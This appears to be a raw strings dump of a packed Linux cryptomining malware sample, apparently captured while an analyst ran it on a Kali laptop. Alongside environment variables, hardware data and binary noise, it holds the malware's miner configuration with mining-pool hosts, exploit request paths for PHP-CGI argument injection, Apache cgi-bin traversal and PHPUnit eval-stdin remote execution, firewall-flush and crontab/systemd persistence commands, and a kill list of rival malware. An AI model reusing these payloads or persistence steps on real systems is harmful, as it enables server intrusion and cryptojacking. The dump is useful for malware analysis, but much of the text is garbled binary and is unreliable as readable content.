KDE_APPLICATIONS_AS_SCOPE=1
OLDPWD=/home/fire
_=./PnWsXHTYQ5amAUq
WINDOWID=77594638
ntab
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_MENU_PREFIX=plasma-
GTK_IM_MODULE=ibus
POWERSHELL_UPDATECHECK=Off
LESS_TERMCAP_se=
SHELL=/usr/bin/zsh
LESS_TERMCAP_so=
[01;33m
/proc/
hedstat
/usr/lib/firefox-esr/firefox-esr
-contentproc
-isForBrowser
-prefsHandle
0:43039
-prefMapHandle
1:273308
-jsInitHandle
/usr/lib/firefox-esr/firefox-esr
-contentproc
-isForBrowser
-prefsHandle
0:43038
-prefMapHandle
1:273308
-jsInitHandle
/usr/lib/firefox-esr/firefox-esr
-contentproc
-isForBrowser
-prefsHandle
0:43038
-prefMapHandle
1:273308
-jsInitHandle
/usr/lib/firefox-esr/firefox-esr
-contentproc
-isForBrowser
-prefsHandle
0:43039
-prefMapHandle
1:273308
-jsInitHandle
/usr/lib/firefox-esr/firefox-esr
-contentproc
-isForBrowser
-prefsHandle
0:43040
-prefMapHandle
1:273308
-jsInitHandle
COMMAND_NOT_FOUND_INSTALL_PROMPT=1
KONSOLE_DBUS_SESSION=/Sessions/1
XDG_RUNTIME_DIR=/run/user/1000
KONSOLE_DBUS_WINDOW=/Windows/1
XDG_SESSION_DESKTOP=plasmax11
ICEAUTHORITY=/run/user/1000/iceauth_LhVWCF
POWERSHELL_TELEMETRY_OPTOUT=1
SSH_AUTH_SOCK=/run/user/1000/gcr/ssh
DOTNET_CLI_TELEMETRY_OPTOUT=1
   =/tmp/safe/PnWsXHTYQ5amAUq
PATH=/home/fire/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/fire/.dotnet/tools
PATH=/home/fire/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/fire/.dotnet/tools
XAUTHORITY=/run/user/1000/gdm/Xauthority
COMMAND_NOT_FOUND_INSTALL_PROMPT=1
KONSOLE_DBUS_SESSION=/Sessions/1
XDG_RUNTIME_DIR=/run/user/1000
KONSOLE_DBUS_WINDOW=/Windows/1
ORAd6eDiQ4sZ52ImZJ
iting...
Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
/usr/sbin/apache2 -k start
proxies.internetshadow.org:2137
DzHymrv3XgNQ6WvA
esr/firefox-e
KONSOLE_DBUS_ACTIVATION_COOKIE=KsWV+xPPRlhMsC90t1s3rQRu+hiKcJs08kogxmCKWx0=
XDG_DATA_DIRS=/usr/share/gnome:/usr/local/share/:/usr/share/
SYSTEMD_EXEC_PID=1926
GTK_RC_FILES=/etc/gtk/gtkrc:/home/fire/.gtkrc:/home/fire/.config/gtkrc
XDG_CURRENT_DESKTOP=KDE
KONSOLE_DBUS_SERVICE=:1.109
KONSOLE_VERSION=251201
CLUTTER_IM_MODULE=ibus
hwlocVersion
KDE_SESSION_UID=1000
PnWsXHTYQ5amAUq
XDG_SESSION_CLASS=user
TERM=xterm-256color
SHELL=/usr/bin/zsh
WINDOWID=77594638
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_MENU_PREFIX=plasma-
GTK_IM_MODULE=ibus
POWERSHELL_UPDATECHECK=Off
LESS_TERMCAP_se=
LESS_TERMCAP_so=
[01;33m
XMODIFIERS=@im=ibus
NMAP_PRIVILEGED=
DESKTOP_SESSION=plasmax11
T%d5
tHz@
        <,L
p.2137gang.st
p.2137gang.pl
p.2137gang.net
p.2137gang.shop
LANGUAGE=
5~oA9
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.jxl=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90::ow=30;44:
1.0       
UX430UNR
1.0       
1.0       
DMIBIOSDate
03/19/2018
Backend
Linux
LinuxCgroup
OSName
Linux
OSRelease
OSVersion
HostName
localhost
x86_64
2.12.2
ProcessName
DMIBoardName
DMIBoardVersion
DMIBoardAssetTag
ATN12345678901234567
DMIProductName
DMIProductVersion
FrequencyMaxMHz
FrequencyBaseMHz
DMIBoardVendor
rx/wow
Mode
Inclusive
Inclusive
Mode
Inclusive
Inclusive
Inclusive
Mode
Inclusive
Inclusive
Inclusive
Mode
Inclusive
4000
1800
1024
UX430UNR
XDG_CONFIG_DIRS=/home/fire/.config/kdedefaults:/etc/xdg:/usr/share/desktop-base/kf5-settings
XDG_CONFIG_DIRS=/home/fire/.config/kdedefaults:/etc/xdg:/usr/share/desktop-base/kf5-settings
p.2137gang.st
LinuxCapacity
ASUSTeK COMPUTER INC.
XDG_SESSION_TYPE=x11
U CPU @
1.80GH
).scop
/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.kde.konsole-29357.scope/tab(29371).scope
DMIChassisVendor
ASUSTeK COMPUTER INC.
DMIChassisType
DMIChassisVersion
DMIChassisAssetTag
No Asset Tag
DMIBIOSVendor
American Megatrends Inc.
DMIBIOSVersion
UX430UNR.305
DMISysVendor
ASUSTeK COMPUTER INC.
6.18.5+kali-amd64
Architecture
LANG=en_US.UTF-8
GenuineIntel
Linux
localhost
6.18.5+kali-amd64
#1 SMP PREEMPT_DYNAMIC Kali 6.18.5-1kali1 (2026-01-19)
x86_64
(none)
SESSION_MANAGER=local/localhost:@/tmp/.ICE-unix/1866,unix/localhost:/tmp/.ICE-unix/1866
GTK2_RC_FILES=/etc/gtk-2.0/gtkrc:/home/fire/.gtkrc-2.0:/home/fire/.config/gtkrc-2.0
SESSION_MANAGER=local/localhost:@/tmp/.ICE-unix/1866,unix/localhost:/tmp/.ICE-unix/1866
CPUModelNumber
GDM_LANG=en_US.UTF-8
IM_CONFIG_PHASE=1
ICEAUTHORITY=/run/user/1000/iceauth_LhVWCF
POWERSHELL_TELEMETRY_OPTOUT=1
SSH_AUTH_SOCK=/run/user/1000/gcr/ssh
DOTNET_CLI_TELEMETRY_OPTOUT=1
l.servic
XDG_SESSION_DESKTOP=plasmax11
l.servic
XAUTHORITY=/run/user/1000/gdm/Xauthority
   =/tmp/safe/PnWsXHTYQ5amAUq
UVWATAUAVAWH
Q8fH
API3A@fH
IXI3IH
)t$@
)|$0D
)D$ A
(t$@
(|$0D
(D$ H
PA_A^A]A\_^]
t$ WATAUAVAWH
A L3
Q8fH
API3A@fH
IXI3IHI
)t$0fH
)|$ D
(t$0L
\$@I
(|$ L
A_A^A]A\_
t$ WATAUAVAWH
A L3
Q8fH
API3A@fH
IXI3IHI
)t$0fH
)|$ D
(t$0L
\$@I
(|$ L
A_A^A]A\_
SUVWATAUAVAWH
Y(L3Y
Q8H3Q
y I39I
i(I3i
)L$pD
)T$`D
)\$PD
)d$@D
)l$0D
)t$ D
IXI3HH
~hhfH
@PI3@@f
I8I3I
A0I3A
IXI3IHfH
API3A@f
~A`f
~AhL
o9ff.
K3D+
o<+L
0I3D0
(l$0L
(t$ D
A_A^A]A\_^][
UVWATAUAVAWH
Q8fH
API3A@fH
IXI3IH
)t$@
)|$0D
)D$ A
(t$@
(|$0D
(D$ H
PA_A^A]A\_^]
t$ WATAUAVAWH
A L3
Q8fH
API3A@fH
IXI3IHI
)t$0fH
)|$ D
(t$0L
\$@I
(|$ L
A_A^A]A\_
t$ WATAUAVAWH
A L3
Q8fH
API3A@fH
IXI3IHI
)t$0fH
)|$ D
(t$0L
\$@I
(|$ L
A_A^A]A\_
SUVWATAUAVAWH
Y(L3Y
Q8H3Q
y I39I
i(I3i
)L$pD
)T$`D
)\$PD
)d$@D
)l$0D
)t$ D
IXI3HH
~hhfH
@PI3@@f
I8I3I
A0I3A
IXI3IHfH
API3A@f
~A`f
~AhL
o9ff.
K3D+
o<+L
0I3D0
(l$0L
(t$ D
A_A^A]A\_^][
UVWATAUAVAWH
Q8fH
API3A@fH
IXI3IH
)t$@
)|$0D
)D$ A
(t$@
(|$0D
(D$ H
PA_A^A]A\_^]
t$ WATAUAVAWH
A L3
Q8fH
API3A@fH
IXI3IHI
)t$0fH
)|$ D
(t$0L
\$@I
(|$ L
A_A^A]A\_
t$ WATAUAVAWH
A L3
Q8fH
API3A@fH
IXI3IHI
)t$0fH
)|$ D
(t$0L
\$@I
(|$ L
A_A^A]A\_
SUVWATAUAVAWH
Y(L3Y
Q8H3Q
y I39I
i(I3i
)L$pD
)T$`D
)\$PD
)d$@D
)l$0D
)t$ D
IXI3HH
~hhfH
@PI3@@f
I8I3I
A0I3A
IXI3IHfH
API3A@f
~A`f
~AhL
o9ff.
K3D+
o<+L
0I3D0
(l$0L
(t$ D
A_A^A]A\_^][
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
#1 SMP PREEMPT_DYNAMIC Kali 6.18.5-1kali1 (2026-01-19)
SHELL_SESSION_ID=3f58bf5294e746eb9be834f5f2fc30ad
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1
INVOCATION_ID=560c3a6ab1df4d2282848fee4aba19ed
Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
hwloc/2.12.2
U CPU @
1.80GH
1.80GH
Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
1.80GH
CPUFamilyNumber
    "autosave": true,
    "opencl": false,
    "cuda": false,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "max-threads-hint": 95
    },
    "randomx": {
        "mode": "auto",
        "1gb-pages": true,
        "rdmsr": false,
        "wrmsr": true
    },
    "pools": [
        {
            "nicehash": true,
            "url": "proxies.internetshadow.org:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.internetshadow.link:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.identities.network:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.insanitycpp.cx:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.insanecppdev.com:2137"
        }
    ]
/tmp/safe/PnWsXHTYQ5amAUq
LANGUAGE=
XDG_SEAT=seat0
PWD=/tmp/safe
LOGNAME=fire
WINDOWPATH=2
HOME=/home/fire
USERNAME=fire
PROFILEHOME=
MANAGERPID=1520
USER=fire
COLORFGBG=15;0
DISPLAY=:0
SHLVL=2
XDG_VTNR=2
/usr/bin/bas
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
1WLG>
apache2
 -k start
nginx
nginx: worker process
php-fpm: pool www
systemd
bash
-bash
sshd
sshd: {}@notty
/usr/lib/systemd/systemd
/lib/systemd/systemd
apache2
nginx
stratum+tcp://
/cmdline
(deleted)
/exe
self
/proc/
rondo
/tmp
/usr/bin/.sh
/bin/-bash
/bin/systemtd
systemd-worker
ldr.sh
.configrc
skid
bot.
selfrep
redtail
c3pool
cnrig
masscan
zmap
xmrig
proxy.insanecppdev.com
proxy.insanitycpp.cx
proxy.identities.network
proxy.internetshadow.link
proxy.internetshadow.org
p.2137gang.store
p.2137gang.shop
p.2137gang.net
p.2137gang.pl
p.2137gang.st
client-nonce
server-nonce
client-key
server-key
client-iv
server-iv
/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/Util/PHP/eval-stdin.php
/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/LICENSE/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
redtail
redtail
iptables -F >/dev/null 2>&1; iptables -I INPUT -p tcp --dport {} -j ACCEPT >/dev/null 2>&1
" | crontab -
crontab -r >/dev/null 2>&1; echo "@reboot 
crontab
/etc/systemd/system/your-redtail.service
    "autosave": true,
    "opencl": false,
    "cuda": false,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "max-threads-hint": 95
    },
    "randomx": {
        "mode": "auto",
        "1gb-pages": true,
        "rdmsr": false,
        "wrmsr": true
    },
    "pools": [
        {
            "nicehash": true,
            "url": "proxies.internetshadow.org:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.internetshadow.link:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.identities.network:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.insanitycpp.cx:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.insanecppdev.com:2137"
        }
    ]
#UPX!
}f",>
pBr 
2.g|
/n-V
,]yWr
;T*X
#+"qd
b@dT
Elu~
P-U6
H9cW
=fdt
2(U-}
N.'#
2<E.
" ZTM;7
VVj;
O(H'
#Z^[
j'V(
6F|{>H
#~~a
[z->=
,p*l
        ;@r[?
e.we
:eR",)
zIh0
7m5X
XFu_UG`
22@9
?MiN
g3v{N
?S^|8bx
%0O9
bTf#M
Onm"
mu`n
N{sk
(26l
85Z0
c&&b
/wE@
LU]S
<n,V(
$$@ g
^+{i
y_sN
p`Gk
]-2g
C       LPnd
T4T{
()?Mk
8pz3
+\sG
127.0.0.1
CPUVendor
CPUModel
CPUStepping
rx/wow
LANGUAGE=
USER=fire
DISPLAY=:0
SHLVL=2
XDG_VTNR=2
gon2
argon2
127.0.0.1
argon2
A)Tt|
f)Lt|
H0t|
c4Aw
belX
__vdso_gettimeofday
__vdso_time
__vdso_clock_gettime
__vdso_clock_getres
__vdso_getcpu
__vdso_getrandom
__vdso_sgx_enter_enclave
linux-vdso.so.1
LINUX_2.6
expand 32-byte k8
Linux
Linux
6.18.5+kali-amd64
A{$k
K$I+S
;vx1
>sDL
AVSH
K$I+S
X0I9S
[A^]
[A^]
`u}I
J$I+R
K(H=
>sIL
AWAVAUATSH
0[A\A]A^A_]
0[A\A]A^A_]
_ fA
g0fE
GCC: (Debian 15.2.0-12) 15.2.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
Node 0 MemTotal:       16233760 kB
Node 0 MemFree:         1303552 kB
Node 0 MemUsed:        14930208 kB
Node 0 SwapCached:            0 kB
Node 0 Active:         10085128 kB
Node 0 Inactive:        2802900 kB
Node 0 Active(anon):    8246220 kB
Node 0 Inactive(anon):        0 kB
Node 0 Active(file):    1838908 kB
Node 0 Inactive(file):  2802900 kB
Node 0 Unevictable:     1157868 kB
Node 0 Mlocked:             812 kB
Node 0 Dirty:              1176 kB
Node 0 Writeback:             0 kB
Node 0 FilePages:       6050548 kB
Node 0 Mapped:          1106916 kB
Node 0 AnonPages:       7953316 kB
Node 0 Shmem:           1409184 kB
Node 0 KernelStack:       33728 kB
Node 0 PageTables:       104556 kB
Node 0 SecPageTables:      3044 kB
Node 0 NFS_Unstable:          0 kB
Node 0 Bounce:                0 kB
Nod0
    5064
de 0 SReclaimable:     337100 kB
Node 0 P
noop
/sys/devices/system/node/node0/hugepages/hugepages-1048576kB/nr_hugepages
node0
tem/node
cces
ator
/sys/dev
s/write_latencyth
/sys/devices/system/node/node0/access0/initiators
/sys/devices/system/node/node0/access0/initiators/write_latency
e:         1303552 kB
MemAvailable:    5941668 kB
Buffers:          532404 kB
Cached:          5518144 kB
SwapCached:            0 kB
Active:         10085128 kB
Inactive:        2802900 kB
Active(anon):    8246220 kB
Inactive(anon):        0 kB
Active(file):    1838908 kB
Inactive(file):  2802900 kB
Unevictable:     1157868 kB
Mlocked:             812 kB
SwapTotal:             0 kB
SwapFree:              0 kB
Zswap:                 0 kB
Zswapped:              0 kB
Dirty:              1176 kB
Writeback:             0 kB
AnonPage
default
Shmem:  
7100
im:     
   =/tmp/safe/PnWsXHTYQ5amAUq
H}u6s4
#x86_64
/usr/sbin/apache2 -k start
./PnWsXHTYQ5amAUq
CORE
apache2 -k start/usr/sbin/apache2 -k start
CORE
CORE

LINUX

IGISCORE
CORE
CORE

LINUX

IGISCORE
CORE
CORE
LINUX
IGISCORE
CORE
ELIFCORE
/memfd:upx (deleted)
/tmp/safe/PnWsXHTYQ5amAUq
<?xml version="1.0"?>
<!DOCTYPE target SYSTEM "gdb-target.dtd">
<target>
  <architecture>i386:x86-64</architecture>
  <osabi>GNU/Linux</osabi>
  <feature name="org.gnu.gdb.i386.core">
    <flags id="i386_eflags" size="4">
      <field name="CF" start="0" end="0" type="bool"/>
      <field name="" start="1" end="1" type="bool"/>
      <field name="PF" start="2" end="2" type="bool"/>
      <field name="AF" start="4" end="4" type="bool"/>
      <field name="ZF" start="6" end="6" type="bool"/>
      <field name="SF" start="7" end="7" type="bool"/>
      <field name="TF" start="8" end="8" type="bool"/>
      <field name="IF" start="9" end="9" type="bool"/>
      <field name="DF" start="10" end="10" type="bool"/>
      <field name="OF" start="11" end="11" type="bool"/>
      <field name="NT" start="14" end="14" type="bool"/>
      <field name="RF" start="16" end="16" type="bool"/>
      <field name="VM" start="17" end="17" type="bool"/>
      <field name="AC" start="18" end="18" type="bool"/>
      <field name="VIF" start="19" end="19" type="bool"/>
      <field name="VIP" start="20" end="20" type="bool"/>
      <field name="ID" start="21" end="21" type="bool"/>
    </flags>
    <reg name="rax" bitsize="64" type="int64" regnum="0"/>
    <reg name="rbx" bitsize="64" type="int64" regnum="1"/>
    <reg name="rcx" bitsize="64" type="int64" regnum="2"/>
    <reg name="rdx" bitsize="64" type="int64" regnum="3"/>
    <reg name="rsi" bitsize="64" type="int64" regnum="4"/>
    <reg name="rdi" bitsize="64" type="int64" regnum="5"/>
    <reg name="rbp" bitsize="64" type="data_ptr" regnum="6"/>
    <reg name="rsp" bitsize="64" type="data_ptr" regnum="7"/>
    <reg name="r8" bitsize="64" type="int64" regnum="8"/>
    <reg name="r9" bitsize="64" type="int64" regnum="9"/>
    <reg name="r10" bitsize="64" type="int64" regnum="10"/>
    <reg name="r11" bitsize="64" type="int64" regnum="11"/>
    <reg name="r12" bitsize="64" type="int64" regnum="12"/>
    <reg name="r13" bitsize="64" type="int64" regnum="13"/>
    <reg name="r14" bitsize="64" type="int64" regnum="14"/>
    <reg name="r15" bitsize="64" type="int64" regnum="15"/>
    <reg name="rip" bitsize="64" type="code_ptr" regnum="16"/>
    <reg name="eflags" bitsize="32" type="i386_eflags" regnum="17"/>
    <reg name="cs" bitsize="32" type="int32" regnum="18"/>
    <reg name="ss" bitsize="32" type="int32" regnum="19"/>
    <reg name="ds" bitsize="32" type="int32" regnum="20"/>
    <reg name="es" bitsize="32" type="int32" regnum="21"/>
    <reg name="fs" bitsize="32" type="int32" regnum="22"/>
    <reg name="gs" bitsize="32" type="int32" regnum="23"/>
    <reg name="st0" bitsize="80" type="i387_ext" regnum="24"/>
    <reg name="st1" bitsize="80" type="i387_ext" regnum="25"/>
    <reg name="st2" bitsize="80" type="i387_ext" regnum="26"/>
    <reg name="st3" bitsize="80" type="i387_ext" regnum="27"/>
    <reg name="st4" bitsize="80" type="i387_ext" regnum="28"/>
    <reg name="st5" bitsize="80" type="i387_ext" regnum="29"/>
    <reg name="st6" bitsize="80" type="i387_ext" regnum="30"/>
    <reg name="st7" bitsize="80" type="i387_ext" regnum="31"/>
    <reg name="fctrl" bitsize="32" type="int" regnum="32" group="float"/>
    <reg name="fstat" bitsize="32" type="int" regnum="33" group="float"/>
    <reg name="ftag" bitsize="32" type="int" regnum="34" group="float"/>
    <reg name="fiseg" bitsize="32" type="int" regnum="35" group="float"/>
    <reg name="fioff" bitsize="32" type="int" regnum="36" group="float"/>
    <reg name="foseg" bitsize="32" type="int" regnum="37" group="float"/>
    <reg name="fooff" bitsize="32" type="int" regnum="38" group="float"/>
    <reg name="fop" bitsize="32" type="int" regnum="39" group="float"/>
  </feature>
  <feature name="org.gnu.gdb.i386.sse">
    <vector id="v8bf16" type="bfloat16" count="8"/>
    <vector id="v8h" type="ieee_half" count="8"/>
    <vector id="v4f" type="ieee_single" count="4"/>
    <vector id="v2d" type="ieee_double" count="2"/>
    <vector id="v16i8" type="int8" count="16"/>
    <vector id="v8i16" type="int16" count="8"/>
    <vector id="v4i32" type="int32" count="4"/>
    <vector id="v2i64" type="int64" count="2"/>
    <union id="vec128">
      <field name="v8_bfloat16" type="v8bf16"/>
      <field name="v8_half" type="v8h"/>
      <field name="v4_float" type="v4f"/>
      <field name="v2_double" type="v2d"/>
      <field name="v16_int8" type="v16i8"/>
      <field name="v8_int16" type="v8i16"/>
      <field name="v4_int32" type="v4i32"/>
      <field name="v2_int64" type="v2i64"/>
      <field name="uint128" type="uint128"/>
    </union>
    <flags id="i386_mxcsr" size="4">
      <field name="IE" start="0" end="0" type="bool"/>
      <field name="DE" start="1" end="1" type="bool"/>
      <field name="ZE" start="2" end="2" type="bool"/>
      <field name="OE" start="3" end="3" type="bool"/>
      <field name="UE" start="4" end="4" type="bool"/>
      <field name="PE" start="5" end="5" type="bool"/>
      <field name="DAZ" start="6" end="6" type="bool"/>
      <field name="IM" start="7" end="7" type="bool"/>
      <field name="DM" start="8" end="8" type="bool"/>
      <field name="ZM" start="9" end="9" type="bool"/>
      <field name="OM" start="10" end="10" type="bool"/>
      <field name="UM" start="11" end="11" type="bool"/>
      <field name="PM" start="12" end="12" type="bool"/>
      <field name="FZ" start="15" end="15" type="bool"/>
    </flags>
    <reg name="xmm0" bitsize="128" type="vec128" regnum="40"/>
    <reg name="xmm1" bitsize="128" type="vec128" regnum="41"/>
    <reg name="xmm2" bitsize="128" type="vec128" regnum="42"/>
    <reg name="xmm3" bitsize="128" type="vec128" regnum="43"/>
    <reg name="xmm4" bitsize="128" type="vec128" regnum="44"/>
    <reg name="xmm5" bitsize="128" type="vec128" regnum="45"/>
    <reg name="xmm6" bitsize="128" type="vec128" regnum="46"/>
    <reg name="xmm7" bitsize="128" type="vec128" regnum="47"/>
    <reg name="xmm8" bitsize="128" type="vec128" regnum="48"/>
    <reg name="xmm9" bitsize="128" type="vec128" regnum="49"/>
    <reg name="xmm10" bitsize="128" type="vec128" regnum="50"/>
    <reg name="xmm11" bitsize="128" type="vec128" regnum="51"/>
    <reg name="xmm12" bitsize="128" type="vec128" regnum="52"/>
    <reg name="xmm13" bitsize="128" type="vec128" regnum="53"/>
    <reg name="xmm14" bitsize="128" type="vec128" regnum="54"/>
    <reg name="xmm15" bitsize="128" type="vec128" regnum="55"/>
    <reg name="mxcsr" bitsize="32" type="i386_mxcsr" regnum="56" group="vector"/>
  </feature>
  <feature name="org.gnu.gdb.i386.linux">
    <reg name="orig_rax" bitsize="64" type="int" regnum="57"/>
  </feature>
  <feature name="org.gnu.gdb.i386.segments">
    <reg name="fs_base" bitsize="64" type="int" regnum="58"/>
    <reg name="gs_base" bitsize="64" type="int" regnum="59"/>
  </feature>
  <feature name="org.gnu.gdb.i386.avx">
    <reg name="ymm0h" bitsize="128" type="uint128" regnum="60"/>
    <reg name="ymm1h" bitsize="128" type="uint128" regnum="61"/>
    <reg name="ymm2h" bitsize="128" type="uint128" regnum="62"/>
    <reg name="ymm3h" bitsize="128" type="uint128" regnum="63"/>
    <reg name="ymm4h" bitsize="128" type="uint128" regnum="64"/>
    <reg name="ymm5h" bitsize="128" type="uint128" regnum="65"/>
    <reg name="ymm6h" bitsize="128" type="uint128" regnum="66"/>
    <reg name="ymm7h" bitsize="128" type="uint128" regnum="67"/>
    <reg name="ymm8h" bitsize="128" type="uint128" regnum="68"/>
    <reg name="ymm9h" bitsize="128" type="uint128" regnum="69"/>
    <reg name="ymm10h" bitsize="128" type="uint128" regnum="70"/>
    <reg name="ymm11h" bitsize="128" type="uint128" regnum="71"/>
    <reg name="ymm12h" bitsize="128" type="uint128" regnum="72"/>
    <reg name="ymm13h" bitsize="128" type="uint128" regnum="73"/>
    <reg name="ymm14h" bitsize="128" type="uint128" regnum="74"/>
    <reg name="ymm15h" bitsize="128" type="uint128" regnum="75"/>
  </feature>
</target>
.shstrtab
note0
load
```
